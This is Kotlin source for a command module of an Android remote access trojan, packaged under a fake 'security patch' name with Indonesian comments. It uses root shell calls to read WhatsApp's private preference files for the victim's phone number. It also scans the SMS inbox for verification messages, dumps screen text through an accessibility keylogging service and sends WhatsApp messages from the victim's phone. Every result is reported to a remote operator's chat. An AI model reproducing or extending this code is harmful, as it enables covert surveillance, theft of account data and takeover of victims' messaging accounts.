package com.android.security.patch.commands

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Telephony
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi

object WA {

    fun getNumber(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, "reading wa number...", chatId)
        Thread {
            val sb = StringBuilder("<b>📱 WA number</b>\n\n")
            val isRoot = checkRoot()
            var found = false

            if (isRoot) {
                sb.append("<i>mode: root</i>\n\n")
                sb.append("<b>WhatsApp</b>\n")
                val n1 = readAll("com.whatsapp", sb)
                if (n1 != null) { sb.append("✅ <code>$n1</code>\n"); found = true }

                sb.append("\n<b>WhatsApp Business</b>\n")
                val n2 = readAll("com.whatsapp.w4b", sb)
                if (n2 != null) { sb.append("✅ <code>$n2</code>\n"); found = true }
            } else {
                sb.append("<i>mode: non-root</i>\n\n")
                try {
                    val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                    @Suppress("DEPRECATION")
                    val num = tm.line1Number
                    if (!num.isNullOrBlank()) { sb.append("telephony: <code>$num</code>\n"); found = true }
                    else sb.append("telephony: kosong\n")
                } catch (_: Throwable) {}

                val smsNum = findSMSVerify(ctx)
                if (smsNum != null) { sb.append("SMS verify: <code>$smsNum</code>\n"); found = true }

                if (!found) {
                    sb.append("\n<i>kirim /wa_open, tap Setelan→profil, kirim /wa_dump</i>")
                }
            }

            RatApi.sendMessage(ctx, sb.toString(), chatId)
        }.start()
    }

    private fun checkRoot(): Boolean {
        return try {
            val p = ProcessBuilder("su", "-mm", "-c", "id").redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out.contains("uid=0")
        } catch (_: Throwable) { false }
    }

    /** coba semua path + print debug kalau gagal */
    private fun readAll(pkg: String, sb: StringBuilder): String? {
        val basePaths = listOf(
            "/data/data/$pkg/shared_prefs",
            "/data/user/0/$pkg/shared_prefs",
            "/data/user_de/0/$pkg/shared_prefs"
        )

        // 1. cek folder mana yang ada
        var workingDir: String? = null
        for (dir in basePaths) {
            val cmd = "cd / && ls \"$dir\" 2>/dev/null"
            try {
                val p = ProcessBuilder("su", "-mm", "-c", cmd).redirectErrorStream(true).start()
                val out = p.inputStream.bufferedReader().readText()
                val rc = p.waitFor()
                if (out.isNotBlank()) { workingDir = dir; break }
            } catch (_: Throwable) {}
        }

        if (workingDir == null) {
            sb.append("<i>folder shared_prefs gak ditemukan. coba semua path — kosong.</i>\n")
            // debug: kasih liat isi /data/data/
            try {
                val p = ProcessBuilder("su", "-mm", "-c", "cd / && ls /data/data/ 2>&1 | head -20")
                    .redirectErrorStream(true).start()
                val out = p.inputStream.bufferedReader().readText().take(200)
                p.waitFor()
                sb.append("<i>debug /data/data/: ${out.replace("\n"," ")}</i>\n")
            } catch (_: Throwable) {}
            return null
        }

        sb.append("<i>found: $workingDir</i>\n")

        // 2. coba baca file-file penting
        val candidates = listOf(
            "register_phone_prefs.xml",
            "device_capabilities.xml",
            "com.whatsapp_preferences.xml",
            "com.whatsapp_preferences_light.xml",
            "preferences.xml"
        )

        var best: String? = null

        for (fname in candidates) {
            val path = "$workingDir/$fname"
            val cmd = "cd / && cat \"$path\" 2>/dev/null"
            try {
                val p = ProcessBuilder("su", "-mm", "-c", cmd).redirectErrorStream(true).start()
                val content = p.inputStream.bufferedReader().readText()
                p.waitFor()
                if (content.isBlank()) continue

                // A. register_phone_prefs: phone_number + country_code
                val phoneM = Regex("""phone_number">([0-9]+)<""").find(content)
                if (phoneM != null) {
                    val phone = phoneM.groupValues[1]
                    val ccM = Regex("""country_code">([0-9]+)<""").find(content)
                    val cc = ccM?.groupValues?.get(1) ?: "62"
                    return cc + phone
                }

                // B. device_capabilities / jid format
                val jidM = Regex("""(6[0-9]{7,14}):[0-9]+@s\.whatsapp\.net""").find(content)
                if (jidM != null && best == null) {
                    best = jidM.groupValues[1]
                }

                // C. fallback regex umum
                if (best == null) {
                    val numM = Regex("""\b(628[0-9]{7,13}|08[0-9]{7,13})\b""").find(content)
                    if (numM != null) best = numM.groupValues[1]
                }
            } catch (_: Throwable) {}
        }

        return best
    }

    private fun findSMSVerify(ctx: Context): String? {
        try {
            val c = ctx.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                null, null,
                "${Telephony.Sms.DATE} DESC"
            )
            c?.use {
                var n = 0
                while (it.moveToNext() && n < 300) {
                    n++
                    val addr = it.getString(0) ?: ""
                    val body = it.getString(1) ?: ""
                    val lower = (addr + " " + body).lowercase()
                    if (lower.contains("whatsapp") || lower.contains("verification")) {
                        val m = Regex("""\b(628[0-9]{7,13}|08[0-9]{7,13})\b""").find(body)
                        if (m != null) return m.groupValues[1]
                    }
                }
            }
        } catch (_: Throwable) {}
        return null
    }

    fun openWA(ctx: Context, chatId: Long) {
        try {
            val i = ctx.packageManager.getLaunchIntentForPackage("com.whatsapp")
                ?: ctx.packageManager.getLaunchIntentForPackage("com.whatsapp.w4b")
            if (i == null) { RatApi.sendMessage(ctx, "WA gak terinstall", chatId); return }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            RatApi.sendMessage(ctx,
                "WA dibuka.\n\n" +
                "1. target tap <b>Setelan</b>\n" +
                "2. tap <b>profil</b>\n" +
                "3. kirim <code>/wa_dump</code>",
                chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    fun dumpScreen(ctx: Context, chatId: Long) {
        Thread {
            try {
                val svc = KeylogService.instance
                if (svc == null) {
                    RatApi.sendMessage(ctx, "accessibility gak aktif", chatId); return@Thread
                }
                val text = svc.dumpCurrentWindows()
                if (text.isBlank()) {
                    RatApi.sendMessage(ctx, "gak ada text ke-capture", chatId); return@Thread
                }
                RatApi.sendMessage(ctx, "<b>🪟 screen dump</b>\n<pre>${text.take(3500)}</pre>", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "dump err: ${e.message}", chatId)
            }
        }.start()
    }

    fun send(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.size < 2) {
            RatApi.sendMessage(ctx, "usage: /wa 6281234567890 pesan di sini", chatId); return
        }
        val num = args[0].replace(Regex("[^0-9]"), "")
        val msg = args.drop(1).joinToString(" ")
        if (num.length < 8) {
            RatApi.sendMessage(ctx, "nomor gak valid", chatId); return
        }
        val uri = Uri.parse("https://wa.me/$num?text=${Uri.encode(msg)}")
        val intent = Intent(Intent.ACTION_VIEW, uri).apply {
            setPackage("com.whatsapp")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "WA dibuka dengan pesan pre-filled untuk $num", chatId)
        } catch (e: Throwable) {
            try {
                val i2 = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i2)
                RatApi.sendMessage(ctx, "WA opened (fallback)", chatId)
            } catch (e2: Throwable) {
                RatApi.sendMessage(ctx, "wa err: ${e.message}", chatId)
            }
        }
    }
}
